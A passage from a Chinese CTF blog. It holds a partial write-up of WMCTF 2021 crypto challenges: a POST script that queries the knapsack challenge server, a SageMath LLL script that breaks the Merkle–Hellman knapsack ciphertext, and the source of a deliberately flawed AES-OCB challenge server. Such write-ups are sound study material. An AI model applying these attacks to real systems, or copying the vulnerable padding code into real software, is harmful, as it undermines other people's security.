key[:-<span class="number">2</span>].<span class="built_in">hex</span>() + <span class="string">&#x27;*&#x27;</span> * <span class="number">4</span></span><br><span class="line">				mask_enc = enc[:r] + <span class="string">&#x27;*&#x27;</span> * <span class="number">28</span> + enc[<span class="number">32</span>-s:]</span><br><span class="line">				pr(<span class="string">&quot;| enc =&quot;</span>, mask_enc)</span><br><span class="line">				pr(<span class="string">&quot;| key =&quot;</span>, mask_key)</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				die(<span class="string">&quot;| SEND 32 BYTES MESSAGE :X&quot;</span>)</span><br><span class="line">		<span class="keyword">elif</span> ans == <span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">			die(<span class="string">&quot;Quitting ...&quot;</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			die(<span class="string">&quot;Bye ...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure>
<p>暂时还没看</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>20210828 WMCrypto方向部分复现</title>
    <url>/posts/37313bc0/</url>
    <content><![CDATA[<p>woc，这也太难了吧，简直是神仙在打架，看着解出人数就没有什么信心做下去了</p>
<p><a href="https://mp.weixin.qq.com/s/d9qMCbKhM5VTDb9s2ch0rg">全a了，大师傅的博客</a>，然后发WP的那一刻环境也关了</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210830075445852.png" alt="image-20210830075445852"></p>
<p>四道题，一道考格在背包，一道考格在RSA的AGCD，一道考AES.OCB，最后一道不清楚考点</p>
<span id="more"></span>

<h1 id="WM"><a href="#WM" class="headerlink" title="WM"></a>WM</h1><h2 id="Crypto-checkin（recuring）"><a href="#Crypto-checkin（recuring）" class="headerlink" title="Crypto-checkin（recuring）"></a>Crypto-checkin（recuring）</h2><blockquote>
<p>众所周知，L1near是一个著名大黑客，他为W&amp;M编写了一个全自动的水群机器人， 我们偷到了L1near在开发时的简易版本，并且获得了交互的接口，你能帮我们找到L1near偷偷藏起来的flag吗？</p>
</blockquote>
<p><a href="http://47.104.243.99:10000/">Link</a></p>
<p>第二天上了update</p>
<blockquote>
<p>请提交合法的secret中最小的那个，题目没有说清楚，给各位师傅添麻烦了～</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>W&amp;M exclusive robot<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">    <span class="selector-tag">h1</span> &#123;<span class="attribute">text-align</span>:center&#125;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">p</span> &#123;<span class="attribute">text-align</span>:center&#125;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">form</span> &#123;<span class="attribute">text-align</span>:center&#125;</span></span><br><span class="line"><span class="css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Fully automatic rp system<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>Come and get your rp value today!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">hr</span>&gt;</span><span class="tag">&lt;/<span class="name">hr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;show.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">id</span>=<span class="string">&quot;rp&quot;</span> <span class="attr">name</span>=<span class="string">&quot;rp&quot;</span> <span class="attr">value</span>=<span class="string">&quot;rp&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Get today&#x27;s rp!&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">ran</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> rp = <span class="built_in">Math</span>.floor( <span class="built_in">Math</span>.random() * <span class="number">100</span>);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.getElementById(<span class="string">&quot;rp&quot;</span>).setAttribute(<span class="string">&#x27;value&#x27;</span>,rp);</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">    ran();</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">-------------------------------------------------------</span></span><br><span class="line"><span class="comment">Maybe there are some Easter eggs?</span></span><br><span class="line"><span class="comment">So where are them?</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure>

<p>rp是0到99的整数，但是post100会得到</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210828113817600.png" alt="image-20210828113817600"></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>W&amp;M exclusive robot<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">    <span class="selector-tag">h1</span> &#123;<span class="attribute">text-align</span>:center&#125;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">p</span> &#123;<span class="attribute">text-align</span>:center&#125;</span></span><br><span class="line"><span class="css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Fully automatic rp system<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Come and get your rp value today!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span><span class="tag">&lt;/<span class="name">hr</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Your rp value:100<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Wow! Golden legend!<span class="comment">&lt;!-- so why not try to post &#x27;flag&#x27; as rp? --&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>没有分析出什么东西，稍微梳理一下</p>
<ul>
<li><p>0~19</p>
<p><code>Ah-ha! There is a idiot!</code></p>
</li>
<li><p>20~39</p>
<p><code>Gee, this is too miserable.</code></p>
</li>
<li><p>40~59</p>
<p><code>Oh, you almost passed it!</code></p>
</li>
<li><p>60~79</p>
<p><code>Fortunately, you passed 60.</code></p>
</li>
<li><p>80~99</p>
<p><code>You are Koi! Congratulations!</code></p>
</li>
<li><p>100</p>
<p><code>Wow! Golden legend!&lt;!-- so why not try to post &#39;flag&#39; as rp? --&gt;</code></p>
</li>
<li><p>flag</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">Your rp value:1620418829165478</span><br><span class="line"></span><br><span class="line">What happend to my bot?????</span><br><span class="line"></span><br><span class="line">Let me find something in my backpack which can fix this bug!</span><br></pre></td></tr></table></figure></li>
</ul>
<p>第一次写post脚本，祭奠一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exDigit</span>(<span class="params">String</span>):</span></span><br><span class="line">    d = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> String:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;0&#x27;</span> &lt;= j &lt;= <span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">            d = d * <span class="number">10</span> + <span class="built_in">int</span>(j)</span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line">x = <span class="number">999999999999999999999999999999999</span></span><br><span class="line">url = <span class="string">&quot;http://47.104.243.99:10000/show.php&quot;</span></span><br><span class="line">r = requests.post(url, &#123;<span class="string">&quot;rp&quot;</span>: <span class="number">2017515922459700</span>&#125;)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65537</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> r.text <span class="keyword">or</span> <span class="string">&#x27;WMCTF&#x27;</span> <span class="keyword">in</span> r.text <span class="keyword">or</span> <span class="string">&#x27;wmctf&#x27;</span> <span class="keyword">in</span> r.text <span class="keyword">or</span> <span class="string">&#x27;1620418829165478&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        <span class="built_in">print</span>(x)</span><br><span class="line">    line = r.text[<span class="number">205</span>:][:<span class="number">37</span>]</span><br><span class="line">    t = exDigit(line)</span><br><span class="line">    <span class="keyword">if</span> t &lt; x:</span><br><span class="line">        x = t</span><br><span class="line">    <span class="built_in">print</span>(t)</span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&quot;rp&quot;</span>: t</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url, payload)</span><br></pre></td></tr></table></figure>

<p>然而看了WP后发现，这些搜集的信息都没什么用，我直接原地爆炸</p>
<p>考的是背包，<a href="https://ctf-wiki.org/crypto/asymmetric/knapsack/knapsack/">CTF Wiki上这篇背包挺通俗易懂的</a>，主要掌握以下这些概念吧：<strong>超递增</strong>，<strong>Merkle–Hellman背包加密</strong>，<strong>构造01格破解</strong></p>
<p>不过是看了WP还不懂系列。首先想知道是怎么看出这机器背后是背包加密的，然后为什么<code>post 2^i+a</code>就可以得到背包每一项的值，<code>i</code>和<code>a</code>分别是什么</p>
<p>目前的理解是，<code>post flag</code>得到的<code>1620418829165478</code>就是密文，然后破解得到私钥，解密</p>
<p>但目前还有很多疑点以及不懂的地方，太难了，后续补充吧</p>
<hr>
<p>来了，这是这几天来的第三次复现，看了Striving师傅的博客终于或多或少有点理解了。好吧，原来菜鸡是我自己</p>
<p>看到backpack想到的背包，当时一直以为是备份的意思</p>
<p>简单介绍下<strong>背包加密</strong>，又是从la佬这里学习而来</p>
<p>首先<strong>背包问题</strong>就是我们熟知的背包问题，下面这段话也许能重拾记忆</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210903154901333.png" alt="image-20210903154901333"></p>
<ul>
<li><p>私钥生成</p>
<p>选择一个<strong>超递增集</strong>${s_1, s_2, \cdots, s_n}$</p>
<p>所谓的超递增集就是满足第i个数大于前面所有数的和</p>
</li>
<li><p>公钥生成</p>
<ol>
<li><p>选取模数m，确保$m&gt;\sum\limits_{i=1}^n s_i$</p>
</li>
<li><p>选取乘数w，确保$(w,\ m)=1$，这里又说w也是私钥</p>
</li>
<li><p>生成公钥集$t_i$，$t_i\equiv ws_i\ (mod\ m)$</p>
</li>
</ol>
</li>
<li><p>加密</p>
<p>明文b的每一位的二进制为$b_i$<br>$$<br>c=\sum\limits_{i=1}^nt_ib_i\ (mod\ m)<br>$$</p>
</li>
<li><p>解密</p>
<p>先求$w^{-1}$，则<br>$$<br>b=\sum\limits_{i=1}^nw^{-1}t_ib_i\ (mod\ m)=\sum\limits_{i=1}^ns_ib_i\ (mod\ m)<br>$$</p>
</li>
</ul>
<p>该密码系统有一个密度，为$d=\frac{n}{log_2(max{t_i})}$</p>
<p>然后就是看不懂的地方说，Striving师傅说春哥师傅说每次post$2^i$，会发现周期是32，得到的值也就公钥集里面的值。借下数据，相当于知道公钥集和密文，要求明文</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">t = [<span class="number">97005071980911</span>, <span class="number">32652300906411</span>, <span class="number">73356817713575</span>, <span class="number">108707065719744</span>, <span class="number">103728503304990</span>, <span class="number">49534310783118</span>, <span class="number">53330718889073</span>, <span class="number">2121345207564</span>, <span class="number">46184783396167</span>, <span class="number">115771983454147</span>, <span class="number">64261597617025</span>, <span class="number">2311575715655</span>, <span class="number">56368973049223</span>, <span class="number">84737125416797</span>, <span class="number">24316288533033</span>, <span class="number">82963866264519</span>, <span class="number">101019837363048</span>, <span class="number">25996629336722</span>, <span class="number">41785472478854</span>, <span class="number">68598110798404</span>, <span class="number">40392871001665</span>, <span class="number">94404798756171</span>, <span class="number">54290928637774</span>, <span class="number">112742212150946</span>, <span class="number">91051110026378</span>, <span class="number">124542182410773</span>, <span class="number">40388473698647</span>, <span class="number">22059564851978</span>, <span class="number">57353373067776</span>, <span class="number">80692115733908</span>, <span class="number">84559172686971</span>, <span class="number">28186390895657</span>]</span><br><span class="line">c = <span class="number">1620418829165478</span></span><br></pre></td></tr></table></figure>

<p>有了这个可以求出密度</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> log</span><br><span class="line"></span><br><span class="line">d = <span class="built_in">len</span>(t) / log(<span class="built_in">max</span>(t), <span class="number">2</span>)</span><br><span class="line"><span class="comment"># d = 0.6834156494834176</span></span><br></pre></td></tr></table></figure>

<p>说是低密度可以直接搞，不太懂原理，抄个脚本，也是用到格</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210903164957451.png" alt="抄自论文"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">t = [<span class="number">97005071980911</span>, <span class="number">32652300906411</span>, <span class="number">73356817713575</span>, <span class="number">108707065719744</span>, <span class="number">103728503304990</span>, <span class="number">49534310783118</span>, <span class="number">53330718889073</span>, <span class="number">2121345207564</span>, <span class="number">46184783396167</span>, <span class="number">115771983454147</span>, <span class="number">64261597617025</span>, <span class="number">2311575715655</span>, <span class="number">56368973049223</span>, <span class="number">84737125416797</span>, <span class="number">24316288533033</span>, <span class="number">82963866264519</span>, <span class="number">101019837363048</span>, <span class="number">25996629336722</span>, <span class="number">41785472478854</span>, <span class="number">68598110798404</span>, <span class="number">40392871001665</span>, <span class="number">94404798756171</span>, <span class="number">54290928637774</span>, <span class="number">112742212150946</span>, <span class="number">91051110026378</span>, <span class="number">124542182410773</span>, <span class="number">40388473698647</span>, <span class="number">22059564851978</span>, <span class="number">57353373067776</span>, <span class="number">80692115733908</span>, <span class="number">84559172686971</span>, <span class="number">28186390895657</span>]</span><br><span class="line">ct = <span class="number">1620418829165478</span></span><br><span class="line">n = <span class="built_in">len</span>(t)</span><br><span class="line">M = Matrix.identity(n)</span><br><span class="line"></span><br><span class="line">last_row = [<span class="number">0</span> <span class="keyword">for</span> x <span class="keyword">in</span> t]</span><br><span class="line">M_last_row = Matrix(ZZ, <span class="number">1</span>, <span class="built_in">len</span>(last_row), last_row)</span><br><span class="line"></span><br><span class="line">last_col = t[:]</span><br><span class="line">last_col.append(ct)</span><br><span class="line">M_last_col = Matrix(ZZ, <span class="built_in">len</span>(last_col), <span class="number">1</span>, last_col)</span><br><span class="line"></span><br><span class="line">M = M.stack(M_last_row)</span><br><span class="line">M = M.augment(M_last_col)</span><br><span class="line"></span><br><span class="line">X = M.LLL()</span><br><span class="line">target = X[-<span class="number">1</span>][:-<span class="number">1</span>]</span><br><span class="line">ans = [<span class="built_in">abs</span>(k) <span class="keyword">for</span> k <span class="keyword">in</span> target]</span><br><span class="line">flag = <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> ans])[::-<span class="number">1</span>], <span class="number">2</span>)</span><br><span class="line"><span class="comment"># 4159506287</span></span><br></pre></td></tr></table></figure>

<p>魔改la佬的脚本</p>
<p>然后听说把解密得到的flag这串数字post过去就得到flag了，你得到了吗</p>
<hr>
<h2 id="Crypto-ocb（unsolved）"><a href="#Crypto-ocb（unsolved）" class="headerlink" title="Crypto-ocb（unsolved）"></a>Crypto-ocb（unsolved）</h2><blockquote>
<p>L1near已经疲倦了AK比赛的生活了，他想趁此机会学习一下AES.OCB，这是他最新实现的一个加密系统，你来帮他看看有什么问题吧。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ocb.aes <span class="keyword">import</span> AES <span class="comment"># https://github.com/kravietz/pyOCB</span></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> ocb <span class="keyword">import</span> OCB</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">xor = <span class="keyword">lambda</span> s1 , s2 : <span class="built_in">bytes</span>([x1^x2 <span class="keyword">for</span> x1,x2 <span class="keyword">in</span> <span class="built_in">zip</span>(s1,s2)])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(data) % <span class="number">16</span> != <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(data[-<span class="number">1</span>]):</span><br><span class="line">            <span class="keyword">if</span>(data[-<span class="number">1</span>] != data[-<span class="number">1</span>-i]):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="keyword">if</span> check(data):</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    padlen = <span class="number">16</span> - <span class="built_in">len</span>(data) % <span class="number">16</span></span><br><span class="line">    <span class="keyword">return</span> data + padlen * <span class="built_in">bytes</span>([padlen])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unpad</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check(data):</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">return</span> data[:-data[-<span class="number">1</span>]]</span><br><span class="line"></span><br><span class="line">BANNER =<span class="string">br&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"> __      __          ___                                           __                                               __       ___  </span></span><br><span class="line"><span class="string">/\ \  __/\ \        /\_ \                                         /\ \__                                           /\ \__  /&#x27;___\ </span></span><br><span class="line"><span class="string">\ \ \/\ \ \ \     __\//\ \     ___    ___     ___ ___      __     \ \ ,_\   ___       __  __  __    ___ ___     ___\ \ ,_\/\ \__/ </span></span><br><span class="line"><span class="string"> \ \ \ \ \ \ \  /&#x27;__`\\ \ \   /&#x27;___\ / __`\ /&#x27; __` __`\  /&#x27;__`\    \ \ \/  / __`\    /\ \/\ \/\ \ /&#x27; __` __`\  /&#x27;___\ \ \/\ \ ,__\</span></span><br><span class="line"><span class="string">  \ \ \_/ \_\ \/\  __/ \_\ \_/\ \__//\ \L\ \/\ \/\ \/\ \/\  __/     \ \ \_/\ \L\ \   \ \ \_/ \_/ \/\ \/\ \/\ \/\ \__/\ \ \_\ \ \_/</span></span><br><span class="line"><span class="string">   \ `\___x___/\ \____\/\____\ \____\ \____/\ \_\ \_\ \_\ \____\     \ \__\ \____/    \ \___x___/&#x27;\ \_\ \_\ \_\ \____\\ \__\\ \_\ </span></span><br><span class="line"><span class="string">    &#x27;\/__//__/  \/____/\/____/\/____/\/___/  \/_/\/_/\/_/\/____/      \/__/\/___/      \/__//__/   \/_/\/_/\/_/\/____/ \/__/ \/_/ </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">MENU = <span class="string">br&#x27;&#x27;&#x27;[+] 1.Encrypt</span></span><br><span class="line"><span class="string">[+] 2.Decrypt</span></span><br><span class="line"><span class="string">[+] 3.Get flag</span></span><br><span class="line"><span class="string">[+] 4.Exit</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>(<span class="params">socketserver.BaseRequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_recvall</span>(<span class="params">self</span>):</span></span><br><span class="line">        BUFF_SIZE = <span class="number">2048</span></span><br><span class="line">        data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            part = self.request.recv(BUFF_SIZE)</span><br><span class="line">            data += part</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(part) &lt; BUFF_SIZE:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> data.strip()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">self, msg, newline=<span class="literal">True</span></span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> newline:</span><br><span class="line">                msg += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">            self.request.sendall(msg)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recv</span>(<span class="params">self, prompt=<span class="string">b&#x27;[-] &#x27;</span></span>):</span></span><br><span class="line">        self.send(prompt, newline=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> self._recvall()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>(<span class="params">self</span>):</span></span><br><span class="line">        random.seed(os.urandom(<span class="number">8</span>))</span><br><span class="line">        proof = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])</span><br><span class="line">        _hexdigest = sha256(proof.encode()).hexdigest()</span><br><span class="line">        self.send(<span class="string">f&quot;[+] sha256(XXXX+<span class="subst">&#123;proof[<span class="number">4</span>:]&#125;</span>) == <span class="subst">&#123;_hexdigest&#125;</span>&quot;</span>.encode())</span><br><span class="line">        x = self.recv(prompt=<span class="string">b&#x27;[+] Plz tell me XXXX: &#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(x) != <span class="number">4</span> <span class="keyword">or</span> sha256(x+proof[<span class="number">4</span>:].encode()).hexdigest() != _hexdigest:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">self, nonce, message, associate_data=<span class="string">b&#x27;&#x27;</span></span>):</span></span><br><span class="line">        <span class="keyword">assert</span> nonce <span class="keyword">not</span> <span class="keyword">in</span> self.NONCEs</span><br><span class="line">        self.NONCEs.append(nonce)</span><br><span class="line">        self.ocb.setNonce(nonce)</span><br><span class="line">        message = pad(message)</span><br><span class="line">        tag, cipher = self.ocb.encrypt(<span class="built_in">bytearray</span>(message), <span class="built_in">bytearray</span>(associate_data))</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">bytes</span>(cipher), <span class="built_in">bytes</span>(tag))</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">self, nonce, cipher, tag, associate_data=<span class="string">b&#x27;&#x27;</span></span>):</span></span><br><span class="line">        self.ocb.setNonce(nonce)</span><br><span class="line">        authenticated, message = self.ocb.decrypt(*<span class="built_in">map</span>(<span class="built_in">bytearray</span>, (associate_data, cipher, tag)))</span><br><span class="line">        message = unpad(message)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> authenticated:</span><br><span class="line">            self.send(<span class="string">b&quot;[!] Who are you???&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> message</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">self</span>):</span></span><br><span class="line">        signal.alarm(<span class="number">60</span>)</span><br><span class="line">        self.send(BANNER)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.proof_of_work():</span><br><span class="line">            self.send(<span class="string">b&#x27;[!] Wrong!&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line">        self.send(<span class="string">b&#x27;[+] Welcome my friend!&#x27;</span>)</span><br><span class="line">        self.send(<span class="string">b&#x27;[+] Can you find the secret through the easy encryption system?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        aes = AES(<span class="number">128</span>)</span><br><span class="line">        self.ocb = OCB(aes)</span><br><span class="line">        KEY = os.urandom(<span class="number">16</span>)</span><br><span class="line">        self.ocb.setKey(KEY)</span><br><span class="line">        self.NONCEs = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            self.send(MENU, newline=<span class="literal">False</span>)</span><br><span class="line">            choice = self.recv()</span><br><span class="line">            <span class="keyword">if</span>(choice == <span class="string">b&#x27;1&#x27;</span>):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    self.send(<span class="string">b&#x27;[+] Please input your nonce&#x27;</span>)</span><br><span class="line">                    nonce = b64decode(self.recv())</span><br><span class="line">                    self.send(<span class="string">b&#x27;[+] Please input your message&#x27;</span>)</span><br><span class="line">                    message = b64decode(self.recv())</span><br><span class="line">                    associate_data = <span class="string">b&#x27;from baby&#x27;</span></span><br><span class="line">                    ciphertext, tag = self.encrypt(nonce, message, associate_data)</span><br><span class="line">                    self.send(<span class="string">b&quot;[+] ciphertext: &quot;</span> + b64encode(ciphertext))</span><br><span class="line">                    self.send(<span class="string">b&quot;[+] tag: &quot;</span> + b64encode(tag))</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    self.send(<span class="string">b&quot;[!] ERROR!&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span>(choice == <span class="string">b&#x27;2&#x27;</span>):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    self.send(<span class="string">b&#x27;[+] Please input your nonce&#x27;</span>)</span><br><span class="line">                    nonce = b64decode(self.recv())</span><br><span class="line">                    self.send(<span class="string">b&#x27;[+] Please input your ciphertext&#x27;</span>)</span><br><span class="line">                    ciphertext = b64decode(self.recv())</span><br><span class="line">                    self.send(<span class="string">b&#x27;[+] Please input your tag&#x27;</span>)</span><br><span class="line">                    tag = b64decode(self.recv())</span><br><span class="line">                    self.send(<span class="string">b&#x27;[+] Please input your associate data&#x27;</span>)</span><br><span class="line">                    associate_data = b64decode(self.recv())</span><br><span class="line">                    <span class="keyword">if</span> associate_data == <span class="string">b&#x27;from admin&#x27;</span>:</span><br><span class="line">                        self.send(<span class="string">b&#x27;[!] You are not admin!&#x27;</span>)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    message = self.decrypt(nonce, ciphertext, tag, associate_data)</span><br><span class="line">                    self.send(<span class="string">b&#x27;[+] plaintext: &#x27;</span> + b64encode(message))</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    self.send(<span class="string">b&quot;[!] ERROR!&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span>(choice == <span class="string">b&#x27;3&#x27;</span>):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    nonce = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">16</span></span><br><span class="line">                    message = flag</span><br><span class="line">                    associate_data = <span class="string">b&#x27;from admin&#x27;</span></span><br><span class="line">                    ciphertext, tag = self.encrypt(nonce, 